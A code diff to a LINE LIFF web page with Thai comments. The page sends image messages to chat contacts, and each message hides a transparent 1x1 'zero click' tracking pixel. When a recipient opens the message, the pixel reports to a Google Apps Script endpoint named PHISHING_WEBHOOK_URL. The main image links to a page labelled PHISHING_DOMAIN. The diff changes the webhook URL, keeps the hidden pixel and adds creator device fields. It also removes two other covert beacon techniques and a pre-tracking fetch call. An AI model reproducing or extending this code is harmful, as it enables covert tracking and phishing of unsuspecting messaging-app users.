@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxOyMhui3rlgKzEyJkIkGjANafscq1jQ_LschSBd3lS_brNys0XQ5dpx0TrrSdjNtYLmQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyQm_c-2LgPnVscBTfW0Me9oZu-Mu0ngUgZVSA8o737q44fs3yfRgxLfOJUPzlYFhqXMg/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -754,12 +754,10 @@
                         caseName: caseName,
                         creatorId: userId,
                         creatorName: displayName,
-                        imageUrl: imageUrl, // เพิ่ม URL ของรูปภาพ
-                        requestId: generateUniqueId(),
-                        // เพิ่มข้อมูลอุปกรณ์ของผู้สร้างเพื่อประโยชน์ในการติดตาม
-                        deviceInfo: getEnhancedDeviceInfo()
+                        imageUrl: imageUrl, // <-- Add the image URL here
+                        requestId: generateUniqueId()
                     }),
-                    mode: 'no-cors' // Note: 'no-cors' might hide errors from the server
+                    mode: 'no-cors' // Note: 'no-cors' might hide errors from the server. Consider changing if debugging server issues.
                 });
                 
                 console.log('บันทึก Tracking Key สำเร็จ');
@@ -823,51 +821,38 @@
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
-                const deviceInfo = getEnhancedDeviceInfo();
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
+                // รวบรวมข้อมูลอุปกรณ์ของผู้สร้าง (จะส่งเป็นข้อมูลแยก)
+                const creatorDeviceInfo = getEnhancedDeviceInfo();
+                
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
+                // แยกข้อมูลให้ชัดเจนระหว่างผู้สร้าง (Creator) และเป้าหมาย (Target)
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                
+                // ข้อมูล Tracking และเคส
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                
+                // ข้อมูลผู้สร้าง - ระบุด้วย prefix creator ให้ชัดเจน
                 zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&creatorUA=${encodeURIComponent(navigator.userAgent)}`;
+                zeroClickTrackUrl += `&creatorPlatform=${encodeURIComponent(creatorDeviceInfo.platform || navigator.platform)}`;
+                zeroClickTrackUrl += `&creatorBrowser=${encodeURIComponent(creatorDeviceInfo.browser || 'Unknown')}`;
                 
-                // เพิ่มข้อมูลอุปกรณ์เป้าหมายสำหรับการระบุตัวตนในช่องทางที่หลากหลายมากขึ้น
+                // เพิ่มพารามิเตอร์ที่จะใช้ในการระบุว่านี่เป็นการเรียกจากเป้าหมาย
                 zeroClickTrackUrl += `&isTarget=true`;
-                zeroClickTrackUrl += `&line_app=true`; // เพิ่มเพื่อระบุว่านี่คือการเรียกจาก LINE app
                 
-                // เพิ่มข้อมูลเบราว์เซอร์เพื่อช่วยในการระบุตัวตน - เพิ่มเติม
-                zeroClickTrackUrl += `&ua=${encodeURIComponent(navigator.userAgent)}`; 
-                zeroClickTrackUrl += `&platform=${encodeURIComponent(navigator.platform)}`;
-                zeroClickTrackUrl += `&vendor=${encodeURIComponent(navigator.vendor || 'unknown')}`;
-                
-                // เพิ่มทางเลือกในการเก็บข้อมูล
-                zeroClickTrackUrl += `&t=${new Date().toISOString()}`;
-                zeroClickTrackUrl += `&r=${randomSuffix}`; // ป้องกันการแคช
+                // ป้องกันการแคช
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
-                
-                // สร้าง URL สำหรับ Zero Click ด้วยวิธีที่สอง - ใช้ iframe
-                const iframeTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&method=iframe`;
-                // เพิ่มข้อมูลเหมือนกับ zeroClickTrackUrl
-                iframeTrackUrl += `&key=${trackingKey}&case=${encodeURIComponent(caseName)}`;
-                iframeTrackUrl += `&creatorId=${encodeURIComponent(userId)}&creatorName=${encodeURIComponent(displayName)}`;
-                iframeTrackUrl += `&isTarget=true&line_app=true&ua=${encodeURIComponent(navigator.userAgent)}`;
-                iframeTrackUrl += `&r=${randomSuffix + '1'}`; // ป้องกันการแคช - เพิ่ม suffix ที่แตกต่างกัน
 
-                // สร้าง URL สำหรับ Zero Click ด้วยวิธีที่สาม - ใช้ div background
-                const bgImageTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&method=bg`;
-                // เพิ่มข้อมูลเหมือนกับ zeroClickTrackUrl
-                bgImageTrackUrl += `&key=${trackingKey}&case=${encodeURIComponent(caseName)}`;
-                bgImageTrackUrl += `&creatorId=${encodeURIComponent(userId)}&creatorName=${encodeURIComponent(displayName)}`;
-                bgImageTrackUrl += `&isTarget=true&line_app=true&ua=${encodeURIComponent(navigator.userAgent)}`;
-                bgImageTrackUrl += `&r=${randomSuffix + '2'}`; // ป้องกันการแคช - เพิ่ม suffix ที่แตกต่างกัน
-
-                // สร้าง Flex Message ที่แชร์ภาพพร้อมเทคนิคการติดตามหลายวิธี
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, 
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -876,7 +861,7 @@
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: { 
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
@@ -885,39 +870,19 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // 1: ใช้ image 1x1 pixel แบบเดิม
+                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
+                                // รูปนี้จะไม่ปรากฏในข้อความแต่จะโหลดเมื่อผู้รับเปิดข้อความ
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
-                                    size: '1px',
+                                    size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '0px',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
                                     offsetStart: '0px'
                                 },
-                                // 2: ใช้ text ที่มี action uri (คลิกไม่ได้แต่อาจจะโหลดได้)
-                                {
-                                    type: 'text',
-                                    text: ' ', // ช่องว่าง
-                                    size: '1px',
-                                    color: '#FFFFFF00', // โปร่งใส
-                                    action: {
-                                        type: 'uri',
-                                        uri: iframeTrackUrl
-                                    }
-                                },
-                                // 3: ใช้ box ที่มี background image (อีกวิธีที่อาจจะโหลดได้)
-                                {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [],
-                                    height: '1px',
-                                    width: '1px',
-                                    backgroundColor: '#FFFFFF00',
-                                    backgroundImage: bgImageTrackUrl
-                                },
-                                // 4: ใช้ box เปล่า (เพื่อให้มีเนื้อหาใน body)
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
                                     type: 'box',
                                     layout: 'vertical',
@@ -949,25 +914,6 @@
                                 console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
                             } else {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
-                            }
-
-                            // แก้ไขใหม่: ส่งข้อมูลการแชร์ไปบันทึกล่วงหน้า เผื่อกรณีที่เป้าหมายเปิดดูแล้วไม่ได้ข้อมูล
-                            try {
-                                // ส่ง tracking data ของผู้สร้างไปก่อน
-                                const pretrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
-                                pretrackUrl += `&key=${trackingKey}`;
-                                pretrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                                pretrackUrl += `&creatorId=${encodeURIComponent(userId)}`;
-                                pretrackUrl += `&creatorName=${encodeURIComponent(displayName)}`;
-                                pretrackUrl += `&isCreatorTracking=true`; // ระบุว่าเป็นการส่งโดยผู้สร้าง
-                                pretrackUrl += `&r=${Date.now()}`; // ป้องกันการแคช
-                                
-                                // ส่ง request ไปเพื่อเก็บข้อมูลล่วงหน้า
-                                fetch(pretrackUrl, { mode: 'no-cors' })
-                                    .then(() => console.log("ส่งข้อมูลล่วงหน้าสำเร็จ"))
-                                    .catch(err => console.error("ไม่สามารถส่งข้อมูลล่วงหน้าได้:", err));
-                            } catch (pretrackError) {
-                                console.error("ข้อผิดพลาดในการส่งข้อมูลล่วงหน้า:", pretrackError);
                             }
                         } catch (saveError) {
                             console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
